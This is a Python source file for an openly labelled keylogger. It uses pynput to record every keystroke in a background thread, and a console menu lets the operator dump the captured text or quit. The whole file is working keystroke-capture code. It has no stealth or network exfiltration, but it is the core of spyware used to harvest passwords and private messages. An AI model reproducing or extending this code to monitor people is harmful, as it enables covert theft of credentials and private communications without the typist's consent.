from threading import Thread
import pynput.keyboard
from termcolor import cprint

keylogvar = ""

keyLoggerRunningControl = True


def process_Key_Press(key):
    global keylogvar
    try:
        keylogvar += str(key.char)
    except AttributeError:
        if key == key.space:
            keylogvar += str(" ")
        else:
            keylogvar += str(key)


def keyBoardLoggerFunc():
    global keyLoggerRunningControl
    cprint("[+] Key logger program started...")
    try:
        # CREATE AN INSTANCE OF KEYBOARD LISTENER
        keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
        with keyboard_Listener:
            while (
                keyLoggerRunningControl
            ):  # Keep running the keylogger thread as long as the 'keyLoggerRunningControl' flag is True
                keyboard_Listener.join(0.1)
                print('moving on')
    except Exception as ex:
        cprint("[-]Something went wrong", "red")


def Handler():
    global keyLoggerRunningControl
    while True:
        command = input("[+]> What do you want to do:").strip()
        if command == "dump log":
            cprint(keylogvar, "green")
            continue
        if command == "quit":
            cprint("[+]Terminating keylogthread ...", "yellow")
            keyLoggerRunningControl = False
            print("[+]Exiting handler")
            break


def main():
    global keyLoggerRunningControl
    try:
        cprint("[+]Starting keylogthread ....")
        keylogthread = Thread(target=keyBoardLoggerFunc)
        keylogthread.start()
        cprint("[+]Started keylogthread ....")
        Handler()
        keyLoggerRunningControl = False 
        keylogthread.join()  # Wait for the keylogger thread to finish before exiting
        cprint("[+] Keylogthread terminated.", "red")
    except KeyboardInterrupt:
        cprint("[-]Operation Cancelled", "red")


if __name__ == "__main__":
    main()
